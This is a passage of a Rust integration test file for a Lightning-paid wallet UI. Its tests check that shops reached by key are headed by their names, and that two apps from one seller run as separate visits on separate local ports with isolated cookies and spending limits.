    assert!(page.contains("nothing is paid"), "{page}");
    let code = { let i = page.find("data-code=\"").unwrap() + 11; page[i..i + page[i..].find('"').unwrap()].to_string() };
    let r = agent.get(&format!("http://127.0.0.1:{port}/__ls/enter?c={code}")).call().unwrap();
    let cookie = r.header("set-cookie").unwrap().split(';').next().unwrap().to_string();
    let body = agent.get(&format!("http://127.0.0.1:{port}/web/")).set("Cookie", &cookie).call().unwrap().into_string().unwrap();
    assert!(body.contains("media server"), "{body}");
    assert!(paid_urls.lock().unwrap().is_empty(), "the preview went through the connector");
}

/// A shop reached by its key: the pages before and during the visit name it by its name and its
/// shortened key, never by its made-up `<52 characters>.shop.invalid` address, which means nothing to
/// a person and ran off the side of the page.
#[test]
fn a_visit_to_a_shop_reached_by_key_is_headed_by_the_shops_name() {
    let _e = ENV.lock().unwrap_or_else(|p| p.into_inner());
    let dir = tempfile::tempdir().unwrap();
    let (pay_sock, _) = signer(dir.path());
    let crun = lightning_stream::serve(lightning_stream::Config { signer: pay_sock, stream_dir: dir.path().to_path_buf(), task: "app".into(), max_sats: 2_000 },
                                       std::net::TcpListener::bind("127.0.0.1:0").unwrap()).unwrap();
    let rig = Rig::new(json!({}), true);
    let sock_path = rig.dir.path().join("signer.sock");
    let _sock = xbt_signer::server::spawn(rig.s.clone(), &sock_path, false).unwrap();
    let pk = [7u8; 32];
    let shop = xbt402::shop::origin_for(&pk);
    let npub = xbt402::shop::npub(&pk);
    let base = format!("{shop}/");
    let data = tempfile::tempdir().unwrap();
    std::fs::create_dir_all(data.path().join("ui")).unwrap();
    std::fs::write(data.path().join("ui/services.json"), json!([
        {"name": "Home films", "kind": "video", "seller": shop, "price_text": "20 sat a MiB", "items": [], "app": format!("{base}web/"), "app_base": base}]).to_string()).unwrap();
    let (srv, _) = spawn_ui(1, |ports| {
        let mut cfg = Config::for_test(sock_path.clone(), data.path().join("ui"), "127.0.0.1:0");
        cfg.connector = format!("http://{}", crun.addr);
        cfg.app_ports = ports;
        cfg
    });
    let wallet = format!("http://{}", srv.addr);
    let agent = ureq::AgentBuilder::new().redirects(0).build();
    let code = std::fs::read_to_string(data.path().join("ui/setup-code")).unwrap();
    let r = agent.post(&format!("{wallet}/setup-password")).set("Content-Type", "application/x-www-form-urlencoded")
        .send_string(&format!("code={}&password=a+long+box+password&password2=a+long+box+password", code.trim()));
    let r = match r { Ok(x) | Err(ureq::Error::Status(_, x)) => x, Err(e) => panic!("{e}") };
    let session = r.header("set-cookie").unwrap().split(';').next().unwrap().to_string();
    let enc = xbt_wallet_ui::services::urlenc;
    let q = format!("u={}&b={}", enc(&format!("{base}web/")), enc(&base));
    // what a person reads: the heading, and the text outside tags and form values
    let shown = |page: &str| -> String {
        let mut out = String::new();
        let mut in_tag = false;
        for c in page.chars() {
            match c { '<' => in_tag = true, '>' => { in_tag = false; out.push(' ') } _ if !in_tag => out.push(c), _ => {} }
        }
        out
    };
    let heading = |page: &str| -> String { let i = page.find("<h1>").unwrap() + 4; page[i..i + page[i..].find("</h1>").unwrap()].to_string() };
    let short = format!("{}…{}", &npub[..13], &npub[npub.len() - 4..]);
    let page = agent.get(&format!("{wallet}/app?{q}")).set("Cookie", &session).call().unwrap().into_string().unwrap();
    assert!(!shown(&page).contains(".shop.invalid") && shown(&page).contains(&short), "before the visit: {}", shown(&page));
    let csrf = { let i = page.find("name=\"csrf\" value=\"").unwrap() + 19; page[i..i + page[i..].find('"').unwrap()].to_string() };
    let page = agent.post(&format!("{wallet}/app")).set("Cookie", &session).set("Content-Type", "application/x-www-form-urlencoded")
        .send_string(&format!("csrf={csrf}&{q}&limit=600")).unwrap().into_string().unwrap();
    assert!(page.contains("data-visit=\""), "the visit opened: {page}");
    assert_eq!(heading(&page), "Home films", "headed by the shop's name");
    assert!(!shown(&page).contains(".shop.invalid") && shown(&page).contains(&short), "during the visit: {}", shown(&page));
}

/// One seller, two apps (a media server and a podcast player), opened by one buyer at once: each is
/// its own visit with its own limit, on its own port, so neither page sees the other's cookies, and
/// stopping one leaves the other open.
#[test]
fn two_apps_of_one_seller_are_two_visits_on_two_origins() {
    let _e = ENV.lock().unwrap_or_else(|p| p.into_inner());
    let sl = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let seller = format!("http://{}", sl.local_addr().unwrap());
    let _srun = xbt_svc::http::serve(Arc::new(Seller { report: Arc::new(Mutex::new(None)) }), sl, 8).unwrap();
    let dir = tempfile::tempdir().unwrap();
    let (pay_sock, paid_urls) = signer(dir.path());
    let crun = lightning_stream::serve(lightning_stream::Config { signer: pay_sock, stream_dir: dir.path().to_path_buf(), task: "app".into(), max_sats: 2_000 },
                                       std::net::TcpListener::bind("127.0.0.1:0").unwrap()).unwrap();
    let rig = Rig::new(json!({}), true);
    let sock_path = rig.dir.path().join("signer.sock");
    let _sock = xbt_signer::server::spawn(rig.s.clone(), &sock_path, false).unwrap();
    let data = tempfile::tempdir().unwrap();
    std::fs::create_dir_all(data.path().join("ui")).unwrap();
    let (jf, pod) = (format!("{seller}/jf/"), format!("{seller}/pod/"));
    std::fs::write(data.path().join("ui/services.json"), json!([
        {"name": "Films", "kind": "video", "seller": seller, "price_text": "20 sat a MiB", "items": [], "app": format!("{jf}web/"), "app_base": jf},
        {"name": "Podcasts", "kind": "api", "seller": seller, "price_text": "1 sat a request", "items": [], "app": pod, "app_base": pod}]).to_string()).unwrap();
    let (srv, ports) = spawn_ui(2, |ports| {
        let mut cfg = Config::for_test(sock_path.clone(), data.path().join("ui"), "127.0.0.1:0");
        cfg.connector = format!("http://{}", crun.addr);
        cfg.app_ports = ports;
        cfg
    });
    let wallet = format!("http://{}", srv.addr);
    let agent = ureq::AgentBuilder::new().redirects(0).build();
    let send = |method: &str, url: &str, cookie: &str, body: Option<&str>| -> (u16, Vec<(String, String)>, String) {
        let mut r = agent.request(method, url);
        if !cookie.is_empty() {
            r = r.set("Cookie", cookie);
        }
        let resp = match match body { Some(b) => r.set("Content-Type", "application/x-www-form-urlencoded").send_string(b), None => r.call() } {
            Ok(x) | Err(ureq::Error::Status(_, x)) => x,
            Err(e) => panic!("{url}: {e}"),
        };
        let headers = resp.headers_names().iter().flat_map(|n| resp.all(n).into_iter().map(|v| (n.to_ascii_lowercase(), v.to_string())).collect::<Vec<_>>()).collect();
        (resp.status(), headers, resp.into_string().unwrap_or_default())
    };
    let cookie_of = |h: &[(String, String)], name: &str| h.iter().filter(|(k, _)| k == "set-cookie").find_map(|(_, v)| v.split(';').next().filter(|c| c.contains(name)).map(str::to_string));
    let code = std::fs::read_to_string(data.path().join("ui/setup-code")).unwrap();
    let (st, h, _) = send("POST", &format!("{wallet}/setup-password"), "", Some(&format!("code={}&password=a+long+box+password&password2=a+long+box+password", code.trim())));
    assert_eq!(st, 303);
    let session = cookie_of(&h, "xbt").expect("a session cookie");
    let field = |page: &str, attr: &str| { let i = page.find(&format!("{attr}=\"")).unwrap() + attr.len() + 2; page[i..i + page[i..].find('"').unwrap()].to_string() };
    let enc = xbt_wallet_ui::services::urlenc;
    // open both, each with its own limit, and enter each on its port
    let open = |entry: &str, base: &str, limit: u32| {
        let (_, _, page) = send("GET", &format!("{wallet}/app?u={}&b={}", enc(entry), enc(base)), &session, None);
        let csrf = { let i = page.find("name=\"csrf\" value=\"").unwrap() + 19; page[i..i + page[i..].find('"').unwrap()].to_string() };
        let (st, _, page) = send("POST", &format!("{wallet}/app"), &session, Some(&format!("csrf={csrf}&u={}&b={}&limit={limit}", enc(entry), enc(base))));
        assert_eq!(st, 200, "{page}");
        let (visit, port, code) = (field(&page, "data-visit"), field(&page, "data-port").parse::<u16>().unwrap(), field(&page, "data-code"));
        let (st, h, _) = send("GET", &format!("http://127.0.0.1:{port}/__ls/enter?c={code}"), "", None);
        assert_eq!(st, 302);
        (visit, port, cookie_of(&h, "__ls_visit_").unwrap(), csrf)
    };
    // the media server keeps each buyer's history, and says so before it opens. The choice is the shop's (the wallet
    // keeps it per shop, and an app's pages reach the shop's other routes): the podcast player of the same shop shows it too
    let page_of = |entry: &str, base: &str| send("GET", &format!("{wallet}/app?u={}&b={}", enc(entry), enc(base)), &session, None).2;
    assert!(page_of(&format!("{jf}web/"), &jf).contains("keeps your watch history"));
    assert!(page_of(&pod, &pod).contains("keeps your watch history"));
    // staying anonymous there is the owner's choice, kept by the wallet
    let p = page_of(&format!("{jf}web/"), &jf);
    let csrf0 = { let i = p.find("name=\"csrf\" value=\"").unwrap() + 19; p[i..i + p[i..].find('"').unwrap()].to_string() };
    let (st, _, _) = send("POST", &format!("{wallet}/identity"), &session,
                          Some(&format!("csrf={csrf0}&origin={}&anonymous=1&u={}&b={}", enc(&seller), enc(&format!("{jf}web/")), enc(&jf))));
    assert_eq!(st, 303);
    assert!(page_of(&format!("{jf}web/"), &jf).contains("You stay anonymous at this shop"));
    assert_eq!(rig.call("identity_get", json!({}))["anonymous"], json!([seller.clone()]));
    let (jf_visit, jf_port, jf_cookie, csrf) = open(&format!("{jf}web/"), &jf, 900);
    let (pod_visit, pod_port, pod_cookie, _) = open(&pod, &pod, 600);
    assert_ne!(jf_port, pod_port, "two apps of one seller are two origins");
    assert!(ports.contains(&jf_port) && ports.contains(&pod_port));
    assert_ne!(jf_visit, pod_visit);
    // each visit has the limit it was opened with
    for (v, limit) in [(&jf_visit, 900), (&pod_visit, 600)] {
        let (_, _, body) = send("GET", &format!("http://{}/visits/{v}", crun.addr), "", None);
        assert_eq!(serde_json::from_str::<Value>(&body).unwrap()["limit_sats"], limit, "{body}");
    }
    // each app's cookies stay with it: the media server's login cookie never reaches the podcast player
    let jf_jar = format!("{session}; {jf_cookie}");
    let (st, h, _) = send("POST", &format!("http://127.0.0.1:{jf_port}/Users/AuthenticateByName"), &jf_jar, Some("{}"));
    assert_eq!(st, 200);
    let jf_sess = h.iter().find(|(k, _)| k == "set-cookie").map(|(_, v)| v.split(';').next().unwrap().to_string()).unwrap();
    let (st, h, _) = send("GET", &format!("http://127.0.0.1:{pod_port}/"), &format!("{session}; {pod_cookie}"), None);
    assert_eq!(st, 200);
    let pod_sess = h.iter().find(|(k, _)| k == "set-cookie").map(|(_, v)| v.split(';').next().unwrap().to_string()).unwrap();
    assert_ne!(jf_sess.split('_').nth(1), pod_sess.split('_').nth(1), "each app's cookies are named for that app: {jf_sess} {pod_sess}");
    // the browser sends a port all its cookies: the podcast player still gets only its own
    let all = format!("{session}; {pod_cookie}; {jf_cookie}; {jf_sess}; {pod_sess}");
    let (st, _, body) = send("GET", &format!("http://127.0.0.1:{pod_port}/me"), &all, None);
    assert_eq!(st, 200, "{body}");
    let seen = serde_json::from_str::<Value>(&body).unwrap()["cookie"].as_str().unwrap().to_string();
    assert!(seen.contains("podsess=p1") && !seen.contains("jfsess") && !seen.contains("__ls_visit") && !seen.contains("xbt"), "{seen}");
    // one visit's cookie opens nothing on the other's port
    assert_eq!(send("GET", &format!("http://127.0.0.1:{pod_port}/"), &format!("{session}; {jf_cookie}"), None).0, 403);
    // stopping the media server's visit leaves the podcast player open
    let (st, _, _) = send("POST", &format!("{wallet}/app-stop"), &session, Some(&format!("csrf={csrf}&visit={jf_visit}")));
    assert_eq!(st, 303);
    assert_eq!(send("GET", &format!("http://127.0.0.1:{jf_port}/web/"), &jf_jar, None).0, 403);
    assert_eq!(send("GET", &format!("http://127.0.0.1:{pod_port}/"), &format!("{session}; {pod_cookie}"), None).0, 200);
    assert!(paid_urls.lock().unwrap().iter().all(|u| u.starts_with(&jf) || u.starts_with(&pod)), "only the two apps' own bases were asked for");
}
